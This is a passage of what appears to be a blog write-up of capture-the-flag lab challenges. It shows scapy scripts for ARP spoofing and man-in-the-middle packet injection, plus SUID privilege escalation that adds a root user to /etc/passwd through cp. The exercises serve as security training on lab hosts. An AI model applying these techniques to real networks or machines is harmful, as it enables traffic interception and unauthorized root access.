class="hljs-string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)/IP(src=<span class="hljs-string">&quot;10.0.0.2&quot;</span>,dst=<span class="hljs-string">&quot;10.0.0.3&quot;</span>,proto=<span class="hljs-number">0xff</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>srp(pk1)<br></code></pre></td></tr></table></figure><h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10"></a>level10</h4><blockquote><p>Manually send a Transmission Control Protocol packet</p></blockquote><p>In this challenge you will manually send a Transmission Control Protocol packet.<br>The packet should have <code>TCP sport=31337, dport=31337, seq=31337, ack=31337, flags=APRSF</code>.<br>The packet should be sent to the remote host at <code>10.0.0.3</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">$ scapy<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_list()<br>[<span class="hljs-string">&#x27;lo&#x27;</span>, <span class="hljs-string">&#x27;eth0&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_hwaddr(<span class="hljs-string">&quot;eth0&quot;</span>)<br><span class="hljs-string">&#x27;96:14:00:18:e9:96&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>pk=Ether(src=<span class="hljs-string">&quot;96:14:00:18:e9:96&quot;</span>,dst=<span class="hljs-string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)/IP(src=<span class="hljs-string">&quot;10.0.0.2&quot;</span>,dst=<span class="hljs-string">&quot;10.0.0.3&quot;</span>)/TCP(sport=<span class="hljs-number">31337</span>,dport=<span class="hljs-number">31337</span>,seq=<span class="hljs-number">31337</span>,ack=<span class="hljs-number">31337</span>,flags=<span class="hljs-string">&#x27;APRSF&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>srp(pk,iface=<span class="hljs-string">&#x27;eth0&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11"></a>level11</h4><blockquote><p>Manually perform a Transmission Control Protocol handshake</p></blockquote><p>In this challenge you will manually perform a Transmission Control Protocol handshake.<br>The initial packet should have <code>TCP sport=31337, dport=31337, seq=31337</code>.<br>The handshake should occur with the remote host at <code>10.0.0.3</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">$ scapy<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_list()<br>[<span class="hljs-string">&#x27;lo&#x27;</span>, <span class="hljs-string">&#x27;eth0&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_hwaddr(<span class="hljs-string">&quot;eth0&quot;</span>)<br><span class="hljs-string">&#x27;42:f4:f8:57:fa:a4&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>pk1=Ether(src=<span class="hljs-string">&quot;42:f4:f8:57:fa:a4&quot;</span>,dst=<span class="hljs-string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)/IP(src=<span class="hljs-string">&quot;10.0.0.2&quot;</span>,dst=<span class="hljs-string">&quot;10.0.0.3&quot;</span>)/TCP(sport=<span class="hljs-number">31337</span>,dport=<span class="hljs-number">31337</span>,seq=<span class="hljs-number">31337</span>,flags=<span class="hljs-string">&#x27;S&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>response=srp(pk1,iface=<span class="hljs-string">&#x27;eth0&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>response[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>QueryAnswer(query=&lt;Ether  dst=ff:ff:ff:ff:ff:ff src=<span class="hljs-number">42</span>:f4:f8:<span class="hljs-number">57</span>:fa:a4 <span class="hljs-built_in">type</span>=IPv4 |&lt;IP  frag=<span class="hljs-number">0</span> proto=<span class="hljs-number">6</span> src=<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span> dst=<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.3</span> |&lt;TCP  sport=<span class="hljs-number">31337</span> dport=<span class="hljs-number">31337</span> seq=<span class="hljs-number">31337</span> flags=S |&gt;&gt;&gt;, answer=&lt;Ether  dst=<span class="hljs-number">42</span>:f4:f8:<span class="hljs-number">57</span>:fa:a4 src=be:9b:<span class="hljs-number">98</span>:0e:<span class="hljs-number">32</span>:<span class="hljs-number">27</span> <span class="hljs-built_in">type</span>=IPv4 |&lt;IP  version=<span class="hljs-number">4</span> ihl=<span class="hljs-number">5</span> tos=<span class="hljs-number">0x0</span> <span class="hljs-built_in">len</span>=<span class="hljs-number">40</span> <span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> flags= frag=<span class="hljs-number">0</span> ttl=<span class="hljs-number">64</span> proto=<span class="hljs-number">6</span> chksum=<span class="hljs-number">0x66cb</span> src=<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.3</span> dst=<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span> |&lt;TCP  sport=<span class="hljs-number">31337</span> dport=<span class="hljs-number">31337</span> seq=<span class="hljs-number">3424417206</span> ack=<span class="hljs-number">31338</span> dataofs=<span class="hljs-number">5</span> reserved=<span class="hljs-number">0</span> flags=SA window=<span class="hljs-number">8192</span> chksum=<span class="hljs-number">0xcabd</span> urgptr=<span class="hljs-number">0</span> |&gt;&gt;&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>pk2=Ether(src=<span class="hljs-string">&quot;42:f4:f8:57:fa:a4&quot;</span>,dst=<span class="hljs-string">&quot;be:9b:98:0e:32:27&quot;</span>)/IP(src=<span class="hljs-string">&quot;10.0.0.2&quot;</span>,dst=<span class="hljs-string">&quot;10.0.0.3&quot;</span>)/TCP(sport=<span class="hljs-number">31337</span>,dport=<span class="hljs-number">31337</span>,seq=<span class="hljs-number">31338</span>,ack=<span class="hljs-number">3424417207</span>,flags=<span class="hljs-string">&#x27;A&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>response1=srp(pk2,iface=<span class="hljs-string">&#x27;eth0&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h4 id="level12-1"><a href="#level12-1" class="headerlink" title="level12"></a>level12</h4><blockquote><p>Manually send an Address Resolution Protocol packet</p></blockquote><p>In this challenge you will manually send an Address Resolution Protocol packet.<br>The packet should have <code>ARP op=is-at</code> and correctly inform the remote host of where the sender can be found.<br>The packet should be sent to the remote host at <code>10.0.0.3</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">$ scapy<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_hwaddr(<span class="hljs-string">&quot;eth0&quot;</span>)<br><span class="hljs-string">&#x27;5e:76:a7:a8:dc:75&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>pk=Ether(src=<span class="hljs-string">&quot;5e:76:a7:a8:dc:75&quot;</span>,dst=<span class="hljs-string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)/ARP(op=<span class="hljs-string">&quot;is-at&quot;</span>,hwsrc=<span class="hljs-string">&quot;5e:76:a7:a8:dc:75&quot;</span>,psrc=<span class="hljs-string">&quot;10.0.0.2&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>srp(pk,iface=<span class="hljs-string">&#x27;eth0&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="level13-1"><a href="#level13-1" class="headerlink" title="level13"></a>level13</h4><blockquote><p>Hijack traffic from a remote host using ARP</p></blockquote><p>In this challenge you will hijack traffic from a remote host using ARP.<br>You do not have the capabilities of a NET ADMIN.<br>The remote host at <code>10.0.0.4</code> is communicating with the remote host at <code>10.0.0.2</code> on port <code>31337</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_hwaddr(<span class="hljs-string">&quot;eth0&quot;</span>)<br><span class="hljs-string">&#x27;8e:4b:78:5c:3c:6a&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>pk=Ether(src=<span class="hljs-string">&quot;8e:4b:78:5c:3c:6a&quot;</span>,dst=<span class="hljs-string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)/ARP(op=<span class="hljs-string">&quot;is-at&quot;</span>,hwsrc=<span class="hljs-string">&quot;8e:4b:78:5c:3c:6a&quot;</span>,psrc=<span class="hljs-string">&quot;10.0.0.2&quot;</span>,pdst=<span class="hljs-string">&quot;10.0.0.4&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sendp(pk,iface=<span class="hljs-string">&quot;eth0&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sniff(iface=<span class="hljs-string">&#x27;eth0&#x27;</span>,<span class="hljs-built_in">filter</span>=<span class="hljs-string">&#x27;tcp[tcpflags]&amp;tcp-push!=0&#x27;</span>,prn=hexdump) <br><br></code></pre></td></tr></table></figure><h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><blockquote><p>Man-in-the-middle traffic between two remote hosts and inject extra traffic</p></blockquote><p>In this challenge you will man in the middle traffic between two remote hosts and inject extra traffic.<br>The remote host at <code>10.0.0.4</code> is communicating with the remote host at <code>10.0.0.3</code> on port <code>31337</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> scapy.layers.inet <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> scapy.layers.l2 <span class="hljs-keyword">import</span> *<br><br>interface = <span class="hljs-string">&quot;eth0&quot;</span><br>local_mac = get_if_hwaddr(interface)<br>local_ip = <span class="hljs-string">&quot;10.0.0.2&quot;</span><br>ip1 = <span class="hljs-string">&quot;10.0.0.3&quot;</span><br>ip2 = <span class="hljs-string">&quot;10.0.0.4&quot;</span><br><br>mac1=getmacbyip(ip=ip1)<br>mac2=getmacbyip(ip=ip2)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\033[1;32mlocal_mac:<span class="hljs-subst">&#123;local_mac&#125;</span>\033[0m&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\033[1;32mmac1:<span class="hljs-subst">&#123;mac1&#125;</span>\033[0m&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\033[1;32mmac2:<span class="hljs-subst">&#123;mac2&#125;</span>\033[0m&quot;</span>)<br><br>eth=Ether(src=local_mac,dst=<span class="hljs-string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)<br>arp1=ARP(op=<span class="hljs-string">&quot;is-at&quot;</span>,hwsrc=local_mac,psrc=ip1,pdst=ip2)<br>arp2=ARP(op=<span class="hljs-string">&quot;is-at&quot;</span>,hwsrc=local_mac,psrc=ip2,pdst=ip1)<br>sendp(eth/arp1,iface=interface)<br>sendp(eth/arp2,iface=interface)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">p:Packet</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;load:&quot;</span>,p[<span class="hljs-string">&#x27;TCP&#x27;</span>].load)<br>        <span class="hljs-keyword">if</span> p[<span class="hljs-string">&#x27;TCP&#x27;</span>].load==<span class="hljs-string">b&quot;COMMANDS:\nECHO\nFLAG\nCOMMAND:\n&quot;</span>:<br>            pdst = p[<span class="hljs-string">&#x27;IP&#x27;</span>].src<br>            psrc = p[<span class="hljs-string">&#x27;IP&#x27;</span>].dst<br>            flags = <span class="hljs-string">&#x27;PA&#x27;</span><br>            ipflags = p[<span class="hljs-string">&#x27;IP&#x27;</span>].flags<br>            dst = p[<span class="hljs-string">&#x27;Ethernet&#x27;</span>].src<br>            dport = p[<span class="hljs-string">&#x27;TCP&#x27;</span>].sport<br>            sport = p[<span class="hljs-string">&#x27;TCP&#x27;</span>].dport<br>            seq = p[<span class="hljs-string">&#x27;TCP&#x27;</span>].ack<br>            ack = p[<span class="hljs-string">&#x27;TCP&#x27;</span>].seq+<span class="hljs-number">24</span><br>            pk = Ether(src=local_mac,dst=dst)/IP(src=psrc,dst=pdst,flags=ipflags)/TCP(sport=sport,dport=dport,seq=seq,ack=ack,flags=flags)/Raw(load=<span class="hljs-string">b&quot;FLAG&quot;</span>)<br>            sendp(pk,iface=interface)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">pass</span><br>    <br>sniff(iface=interface,<span class="hljs-built_in">filter</span>=<span class="hljs-string">&quot;tcp&quot;</span>,prn=process)<br></code></pre></td></tr></table></figure><h2 id="access-control"><a href="#access-control" class="headerlink" title="access-control"></a>access-control</h2><h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><h4 id="查找suid权限文件"><a href="#查找suid权限文件" class="headerlink" title="查找suid权限文件"></a>查找suid权限文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</span><br></code></pre></td></tr></table></figure><h4 id="常用命令提权方法"><a href="#常用命令提权方法" class="headerlink" title="常用命令提权方法"></a>常用命令提权方法</h4><h5 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /etc/passwd &gt; passwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">openssl passwd -1 -salt z hack <span class="hljs-comment"># 生成在passwd文件中hack密码对应的加密后口令</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hack:$1$z<span class="hljs-variable">$eN1X4Y0BpzcYM5USaVCR</span>.0:0:0::/root:/bin/shell&quot;</span> &gt;&gt; passwd <span class="hljs-comment"># 生成一个新用户hack，其登录口令为hack</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cp</span> passwd /etc/passwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su - hack</span><br></code></pre></td></tr></table></figure><h3 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h3><p>In this series of challenges, you will be working with various access control systems.<br>Break the system to get the flag.</p><h4 id="level1-2"><a href="#level1-2" class="headerlink" title="level1"></a>level1</h4><blockquote><p>Flag owned by you with different permissions</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work with different UNIX permissions on the flag.<br>The flag file will be owned by you and have 400 permissions.<br><br>Before:<br>-r-------- 1 root root 58 Sep  1 07:26 /flag<br>After:<br>-r-------- 1 hacker root 58 Sep  1 07:26 /flag<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure><h4 id="level2-2"><a href="#level2-2" class="headerlink" title="level2"></a>level2</h4><blockquote><p>Flag owned by you with different permissions</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work with different UNIX permissions on the flag.<br>The flag file will be owned by root, group as you, and have 040 permissions.<br><br>Before:<br>-r-------- 1 root root 58 Sep  1 07:27 /flag<br>After:<br>----r----- 1 root hacker 58 Sep  1 07:27 /flag<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure><h4 id="level3-2"><a href="#level3-2" class="headerlink" title="level3"></a>level3</h4><blockquote><p>Flag owned by you with different permissions</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work with different UNIX permissions on the flag.<br>The flag file will be owned by you and have 000 permissions.<br><br>Before:<br>-r-------- 1 root root 58 Sep  1 07:36 /flag<br>After:<br>---------- 1 hacker root 58 Sep  1 07:36 /flag<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> 777 /flag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure><h4 id="level4-2"><a href="#level4-2" class="headerlink" title="level4"></a>level4</h4><blockquote><p>How does SETUID work?</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work understand how the SETUID bit for UNIX permissions works.<br>What if /bin/cat had the SETUID bit set?<br><br>Before:<br>-rwxr-xr-x 1 root root 43416 Sep  5  2019 /bin/cat<br>After:<br>-rwsr-xr-x 1 root root 43416 Sep  5  2019 /bin/cat<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure><h4 id="level5-2"><a href="#level5-2" class="headerlink" title="level5"></a>level5</h4><blockquote><p>How does SETUID and cp work?</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work understand how the SETUID bit for UNIX permissions works.<br>What if /bin/cp had the SETUID bit set?<br>Hint: Look into how cp will deal with different permissions.<br>Another Hint: check the man page for cp, any options in there that might help?<br><br>Before:<br>-rwxr-xr-x 1 root root 153976 Sep  5  2019 /bin/cp<br>After:<br>-rwsr-xr-x 1 root root 153976 Sep  5  2019 /bin/cp<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /etc/passwd &gt; passwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">openssl passwd -1 -salt z hack</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hack:$1$z<span class="hljs-variable">$eN1X4Y0BpzcYM5USaVCR</span>.0:0:0::/root:/bin/shell&quot;</span> &gt;&gt; passwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cp</span> passwd /etc/passwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su - hack</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure><h4 id="level6-2"><a href="#level6-2" class="headerlink" title="level6"></a>level6</h4><blockquote><p>Flag owned by a different group</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work with different UNIX permissions on the flag.<br>The flag file is owned by root and a new group.<br>Hint: Search for how to join a group with a password.<br><br>Before:<br>-r-------- 1 root root 58 Sep  1 07:16 /flag<br>After:<br>----r----- 1 root group_yjtqrzub 58 Sep  1 07:16 /flag<br>The password for group_yjtqrzub is: swxryfxa<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">newgrp group_yjtqrzub <span class="hljs-comment"># 输入密码 swxryfxa</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">groups</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure><h4 id="level7-2"><a href="#level7-2" class="headerlink" title="level7"></a>level7</h4><blockquote><p>Flag owned by you with different permissions, multiple users</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work understand how UNIX permissions works with multiple users.<br>You&#x27;ll also be given access to various user accounts, use su to switch between them.<br><br>Before:<br>-r-------- 1 root root 58 Sep  1 07:38 /flag<br>Created user user_iiwybckt with password ghvxdqze<br>After:<br>-------r-- 1 hacker root 58 Sep  1 07:38 /flag<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su user_iiwybckt <span class="hljs-comment"># 输入密码 ghvxdqze</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">or</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> 777 /flag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure><h4 id="level8-2"><a href="#level8-2" class="headerlink" title="level8"></a>level8</h4><blockquote><p>Flag owned by other users</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work understand how UNIX permissions works with multiple users.<br>You&#x27;ll also be given access to various user accounts, use su to switch between them.<br><br>Before:<br>-r-------- 1 root root 58 Sep  1 07:39 /flag<br>Created user user_rhxpgtwj with password tyfbecia<br>After:<br>-r-------- 1 user_rhxpgtwj root 58 Sep  1 07:39 /flag<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su user_rhxpgtwj <span class="hljs-comment"># 输入密码 tyfbecia</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure><h4 id="level9-2"><a href="#level9-2" class="headerlink" title="level9"></a>level9</h4><blockquote><p>Flag owned by other users</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work understand how UNIX permissions works with multiple users.<br>You&#x27;ll also be given access to various user accounts, use su to switch between them.<br><br>Before:<br>-r-------- 1 root root 58 Sep  1 07:42 /flag<br>Created user user_cazgcldr with password kifrychf<br>After:<br>----r----- 1 root user_cazgcldr 58 Sep  1 07:42 /flag<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su user_cazgcldr <span class="hljs-comment"># 输入密码 kifrychf</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure><h4 id="level10-2"><a href="#level10-2" class="headerlink" title="level10"></a>level10</h4><blockquote><p>Flag owned by a group</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work understand how UNIX permissions works with multiple users.<br>You&#x27;ll also be given access to various user accounts, use su to switch between them.<br>Hint: How can you tell which user is in what group?<br><br>Before:<br>-r-------- 1 root root 58 Sep  1 07:43 /flag<br>Created user user_vcrwcfed with password mooryvsi<br>Created user user_nupwlgln with password snmihyet<br>Created user user_xocpstyf with password wvmxkawk<br>Created user user_jodemick with password wkfiqzmw<br>Created user user_jfhyfzcm with password cbrrtkhw<br>Created user user_jlvxtelf with password ezprzexf<br>Created user user_dkajakjt with password prdldnkc<br>Created user user_hlkosnol with password fbrushep<br>Created user user_qsamltgz with password yaknjraz<br>Created user user_gyrkocsy with password fskyzktv<br>After:<br>----r----- 1 root group_nkp 58 Sep  1 07:43 /flag<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /etc/group</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su xxx</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure><h4 id="level11-2"><a href="#level11-2" class="headerlink" title="level11"></a>level11</h4><blockquote><p>Find the flag using multiple users</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work understand how UNIX permissions for directories work with multiple users.<br>You&#x27;ll be given access to various user accounts, use su to switch between them.<br><br>Created user user_betcpnye with password dkhiqvyi<br>Created user user_qydwicsg with password gnaoedja<br>A copy of the flag has been placed somewhere in /tmp:<br>total 40<br>drwxrwxrwt 1 root   root          4096 Sep  1 07:45 .<br>drwxr-xr-x 1 root   root          4096 Sep  1 07:45 ..<br>-rw-rw-r-- 1 root   root             4 Aug  